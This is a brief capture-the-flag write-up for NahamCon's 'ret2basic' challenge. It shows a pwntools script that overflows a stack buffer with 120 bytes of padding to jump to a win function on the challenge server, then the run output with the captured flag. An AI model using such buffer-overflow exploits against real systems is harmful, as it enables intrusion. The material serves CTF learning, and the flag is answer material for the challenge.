## ret2basic

```shell
cfx:  ~/Documents/nahamcon/binary
→ cat exp.py
from pwn import *

elf = ELF("./ret2basic")
win = p64(elf.symbols.win)
#win= 0x401215 (info functions) p win
payload = b"A"*120 + win

#pad = b'A' * cyclic_find("faab") #cyclic(128)
#mm = cyclic_gen()
#mm = mm.get(200) in stack we see faab which is 120
##pay = cyclin_find(b"faab", endian="little")
p = remote("challenge.nahamcon.com", 32043)
p.recvuntil("Can you overflow this?:")
p.sendline(payload)
p.interactive()
```

```
cfx:  ~/Documents/nahamcon/binary
→ python exp.py
[*] '/root/Documents/nahamcon/binary/ret2basic'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.nahamcon.com on port 32043: Done
[*] Switching to interactive mode
 Here's your flag.
flag{d07f3219a8715e9339f31cfbe09d6502}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to challenge.nahamcon.com port 32043
```
